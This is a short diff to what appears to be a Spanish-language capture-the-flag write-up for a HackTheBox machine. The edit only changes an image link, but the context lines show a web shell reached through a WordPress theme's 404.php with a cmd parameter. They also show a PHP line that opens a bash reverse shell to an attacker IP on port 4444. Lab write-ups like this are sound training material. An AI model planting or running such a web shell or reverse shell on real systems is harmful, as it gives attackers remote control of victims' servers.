@@ -731,7 +731,7 @@ Luego accedes a:
 https://makesense.htb/wp-content/themes/webagency/404.php?cmd=id
 ```
 
-![[Pasted image 20260925153305.png]]
+![Respuesta del endpoint vulnerable](../Images/Pasted%20image%2020260925153305.png)
 
 ```php
 <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.204/4444 0>&1' &"); ?>
